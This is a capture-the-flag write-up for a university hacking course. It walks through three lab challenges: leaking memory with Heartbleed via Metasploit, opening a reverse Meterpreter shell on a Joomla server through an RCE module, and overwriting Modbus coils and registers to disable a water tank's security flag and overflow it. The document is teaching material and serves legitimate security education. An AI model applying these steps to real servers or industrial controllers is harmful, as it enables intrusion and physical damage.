# Exercise 1 (Lecture 1)

Exercises using Haaukins for the Hacker space course in the spring semester 2024.

## Challenge: Heartbleed

**Challenge Description**:  Have you heard about the Heartbleed vulnerability? One of the servers in the lab might be vulnerable, and by exploiting the vulnerability you will get the flag.

### Challenge solution

First we need to discover the service which hosts the vulnerable OpenSSL version. OpenSSL is a SSL/TLS library, which means that it should run on port 443, which narrows the search quite a bit. The following Nmap command was run: 

```bash
nmap -p 443 IP_ADDR/24
```

Where the IP_ADDR in this case is the ip of eth0 (because of the haaukins environment). It resulted in:

```bash
PORT    STATE  SERVICE
443/tcp closed https

Nmap scan report for 34.28.96.3
Host is up (0.0022s latency).

PORT    STATE  SERVICE
443/tcp closed https

Nmap scan report for 34.28.96.4
Host is up (0.00021s latency).

PORT    STATE  SERVICE
443/tcp closed https

Nmap scan report for 34.28.96.48
Host is up (0.00027s latency).

PORT    STATE  SERVICE
443/tcp closed https

Nmap scan report for 34.28.96.173
Host is up (0.00093s latency).

PORT    STATE  SERVICE
443/tcp closed https

Nmap done: 256 IP addresses (5 hosts up) scanned in 3.34 seconds
```

Metasploit has a quite intuitive exploit for Heartbleed, so this is the approach taken in order to find the flag. The Nmap result showed multiple hosts which could be vulnerable to the bug, because port 443 is open. Nmap does have a script for finding vulnerable hosts, but it is not present on the haaukins machine. Link: `https://nmap.org/nsedoc/scripts/ssl-heartbleed.html`.

*Exploiting with metasploit:*

in order to exploit the heartbleed bug, metasploit is used. Searching for "heartbleed" results in two different exploits: 

```bash
msf6 > search heartbleed

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   1  auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak

```

When searching in metasploit, and an exploit fitting current needs is found, simply type "use #" where the hashtag is replaced with the number of the search result which is to be used. In this case: "use 1". After selecting the relevant exploit, it is possible to view the different parameters using the "info command".

- The ip is set for the host to be exploited: `set RHOSTS IP`
- Verbose is set to true, in order to view more information: `set verbose true`
- The exploit is executed using "run"

When running the exploit it returns the memory leak to the msfconsole instance where the flag is retrieved: `HKN{1JM-fuD-Ywxn}` (Flags are dynamic in haaukins).
If the RHOSTS is vulnerable the output will look as follows: 

```text
[*] 34.28.96.103:443      - Leaking heartbeat response #1
[*] 34.28.96.103:443      - Sending Client Hello...
[*] 34.28.96.103:443      - SSL record #1:
[*] 34.28.96.103:443      - 	Type:    22
[*] 34.28.96.103:443      - 	Version: 0x0301
[*] 34.28.96.103:443      - 	Length:  86
[*] 34.28.96.103:443      - 	Handshake #1:
[*] 34.28.96.103:443      - 		Length: 82
[*] 34.28.96.103:443      - 		Type:   Server Hello (2)
[*] 34.28.96.103:443      - 		Server Hello Version:           0x0301
[*] 34.28.96.103:443      - 		Server Hello random data:       cc258abc9a2d6d8e040ca76af7817c9fbb8eb655cf2e08fa83f15826237d0812
[*] 34.28.96.103:443      - 		Server Hello Session ID length: 32
[*] 34.28.96.103:443      - 		Server Hello Session ID:        5e3e496c753da88ca7adc17be04dc671290e24cb9d4d65dc903690a93676bdea
[*] 34.28.96.103:443      - SSL record #2:
[*] 34.28.96.103:443      - 	Type:    22
[*] 34.28.96.103:443      - 	Version: 0x0301
[*] 34.28.96.103:443      - 	Length:  817
[*] 34.28.96.103:443      - 	Handshake #1:
[*] 34.28.96.103:443      - 		Length: 813
[*] 34.28.96.103:443      - 		Type:   Certificate Data (11)
[*] 34.28.96.103:443      - 		Certificates length: 810
[*] 34.28.96.103:443      - 		Data length: 813
[*] 34.28.96.103:443      - 		Certificate #1:
[*] 34.28.96.103:443      - 			Certificate #1: Length: 807
[*] 34.28.96.103:443      - 			Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=172.16.12.31,OU=NetSec,O=AAU,C=DK>, issuer=#<OpenSSL::X509::Name CN=172.16.12.31,OU=NetSec,O=AAU,C=DK>, serial=#<OpenSSL::BN:0x00007fea60fd11a8>, not_before=2021-02-25 11:34:48 UTC, not_after=2031-02-23 11:34:48 UTC>
[*] 34.28.96.103:443      - SSL record #3:
[*] 34.28.96.103:443      - 	Type:    22
[*] 34.28.96.103:443      - 	Version: 0x0301
[*] 34.28.96.103:443      - 	Length:  331
[*] 34.28.96.103:443      - 	Handshake #1:
[*] 34.28.96.103:443      - 		Length: 327
[*] 34.28.96.103:443      - 		Type:   Server Key Exchange (12)
[*] 34.28.96.103:443      - SSL record #4:
[*] 34.28.96.103:443      - 	Type:    22
[*] 34.28.96.103:443      - 	Version: 0x0301
[*] 34.28.96.103:443      - 	Length:  4
[*] 34.28.96.103:443      - 	Handshake #1:
[*] 34.28.96.103:443      - 		Length: 0
[*] 34.28.96.103:443      - 		Type:   Server Hello Done (14)
[*] 34.28.96.103:443      - Sending Heartbeat...
[*] 34.28.96.103:443      - Heartbeat response, 65535 bytes
[+] 34.28.96.103:443      - Heartbeat response with leak, 65535 bytes
[*] 34.28.96.103:443      - Printable info leaked:
...HKN{1JM-fuD-Ywxn}.... (more info here)
```

## Unauthenticated access

**Challenge Description**: Some content management systems (e.g Wordpress,Joomla,Shopify,Blogger) are vulnerable to different kind of attacks, in this exercise, you will deal with a CMS which is vulnerable!

### Challenge Solution

First we need to identify the system in question. Using nmap to scan for services and operating systems: `nmap -O -sV IP_ADDR/24`. This resulted in one interesting service (due to the challenge description): 

```text
Nmap scan report for 34.28.96.48
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian) PHP/5.6.12)
MAC Address: 02:42:22:1C:60:30 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
```

This host is running a Joomla blog. It looks like it has not been setup properly, so trying default credentials was the first guess. This did not prove successfull. If the version of the Joomla system being used could be found out, it might be easier looking for vulnerabilities. Searching for joomla in metasploit results in a lot of different exploits. Using a remote code execution vulnerability vulnerability in Joomla, it was possible to get a reverseshell in meterpreter set up:

```text
msf6 exploit(multi/http/joomla_http_header_rce) > set RHOSTS http://34.28.96.48
RHOSTS => http://34.28.96.48
msf6 exploit(multi/http/joomla_http_header_rce) > set RHOSTS 34.28.96.48
RHOSTS => 34.28.96.48
msf6 exploit(multi/http/joomla_http_header_rce) > run

[*] Started reverse TCP handler on 34.28.96.4:4444 
[*] 34.28.96.48:80 - Sending payload ...
[*] Sending stage (39927 bytes) to 34.28.96.48
[*] Meterpreter session 1 opened (34.28.96.4:4444 -> 34.28.96.48:51512) at 2024-02-08 08:18:56 -0500
ls

meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  2916   fil   2021-02-10 11:34:53 -0500  .htaccess
100644/rw-r--r--  18092  fil   2015-10-21 13:48:16 -0400  LICENSE.txt
100644/rw-r--r--  4213   fil   2015-10-21 13:48:16 -0400  README.txt
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  administrator
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  bin
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  cache
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  cli
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  components
100644/rw-r--r--  1840   fil   2021-02-10 11:35:59 -0500  configuration.php
100644/rw-r--r--  2915   fil   2015-10-21 13:48:16 -0400  htaccess.txt
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  images
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  includes
100644/rw-r--r--  1212   fil   2015-10-21 13:48:16 -0400  index.php
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  language
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  layouts
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  libraries
040755/rwxr-xr-x  4096   dir   2024-02-08 08:02:05 -0500  logs
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  media
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  modules
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  plugins
100644/rw-r--r--  842    fil   2015-10-21 13:48:16 -0400  robots.txt
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  templates
040755/rwxr-xr-x  4096   dir   2015-10-21 13:48:16 -0400  tmp
100644/rw-r--r--  1690   fil   2015-10-21 13:48:16 -0400  web.config.txt
```

in the file `configuration.php` credentials for the local database was dislosed, as well as the app secret.

Even though RCE was achieved, it did not yield any results. Searching for credentials did not prove successfull, nor did trying to connect to the MYSQL database through a shell instance launched by meterpreter.

Upon futher inspection, and trying other vulnerabilities, the flag was hidden on the filesystem in the home folder. This means that achieving RCE was the correct approach anyway. Flag: HKN{q3-ahy-hsquF}

## Water tank

**Challenge Description**: My security team told me not to expose my water tank to the public internet (they’re worried someone’s going to make it overflow), but the new interface is SO pretty, I just had to show it off to everyone! Check it out at water-tank.hkn.

### Challenge Solution

Scanning with Nmap again as in the previous challenges, an interesting host is found:

```text
Nmap scan report for 34.28.96.173
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Werkzeug httpd 0.16.0 (Python 3.9.2)
502/tcp open  mbap?
MAC Address: 02:42:22:1C:60:AD (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
```

It is seen that this host has two ports open, 80/tcp on a python server and 502/tcp, which is often Modbus. Going to the webiste, it is seen that is uses a websocket to update the contents of the site, by calling the /update endpoint on the same host. The response from /update is of the following form:

```JSON
{"security":true,"temperature":14,"water_level":250}
```

So clearly it must be getting the water level from somewhere on the same host. Intution says it has something to do with the open modbus port. Metasploit has a modbus client which is quite handy. The client allows us to read coils and registers in the modbus service, and even to read more than one at a time. To do this set the NUMBER option to the desired amount.

It is also important to set the desired action: `set action READ_COILS` is the first attempt. The arguments where: 

```bash
Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  DATA                             no        Data to write (WRITE_COIL and WRITE_REGISTER modes only)
  DATA_ADDRESS    1                yes       Modbus data address
  DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g. 0110
  DATA_REGISTERS                   no        Words to write to each register separated with a comma (WRITE_REGISTERS mode only) e.g. 1,2,3,4
  HEXDUMP         false            no        Print hex dump of response
  NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_DISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS modes only)
  RHOSTS          34.28.96.173     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT           502              yes       The target port (TCP)
  UNIT_NUMBER     1                no        Modbus unit number

```

And the result: 

```text
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 34.28.96.173

[*] 34.28.96.173:502 - Sending READ COILS...
[+] 34.28.96.173:502 - 1 coil values from address 1 : 
[+] 34.28.96.173:502 - [1]
[*] Auxiliary module execution completed
```

This value might define something in the update response, so lets try to change it. Enabling the WRITE_COILS action and setting the following options:

```bash
Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  DATA            0                no        Data to write (WRITE_COIL and WRITE_REGISTER modes only)
  DATA_ADDRESS    1                yes       Modbus data address
  DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g. 0110
  DATA_REGISTERS                   no        Words to write to each register separated with a comma (WRITE_REGISTERS mode only) e.g. 1,2,3,4
  HEXDUMP         false            no        Print hex dump of response
  NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_DISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS modes only)
  RHOSTS          34.28.96.173     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT           502              yes       The target port (TCP)
  UNIT_NUMBER     1                no        Modbus unit number

```

The response from update now return: `{"security":false,"temperature":14,"water_level":250}`. Showing that the coil written to, controlled the security system status. Setting the action to READ_HOLDING_REGISTERS and DATA_ADDRESS to 1, the value 14, is output. This must correspond to the water temperature level. Setting the DATA_ADDRESS to 2, outputs 250, meaning the water_level is controlled by this value. Lets try to manipulate it.

Setting the action to WRITE_REGISTER and using the following options:

```bash
Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  DATA            400              no        Data to write (WRITE_COIL and WRITE_REGISTER modes only)
  DATA_ADDRESS    2                yes       Modbus data address
  DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g. 0110
  DATA_REGISTERS                   no        Words to write to each register separated with a comma (WRITE_REGISTERS mode only) e.g. 1,2,3,4
  HEXDUMP         false            no        Print hex dump of response
  NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_DISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS modes only)
  RHOSTS          34.28.96.173     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT           502              yes       The target port (TCP)
  UNIT_NUMBER     1                no        Modbus unit number

Description:
  This module allows reading and writing data to a PLC using the Modbus protocol.
  This module is based on the 'modiconstop.rb' Basecamp module from DigitalBond,
  as well as the mbtget perl script.


View the full module info with the info -d command.

msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 34.28.96.173

[*] 34.28.96.173:502 - Sending WRITE REGISTER...
[+] 34.28.96.173:502 - Value 400 successfully written at registry address 2
[*] Auxiliary module execution completed
```
Results in the update command returning: `{"security":false,"temperature":14,"water_level":400}`. However this was not enough to overflow the tank. Lets try 450.

450 did the trick! Flag: Not a dynamic flag, wont share..
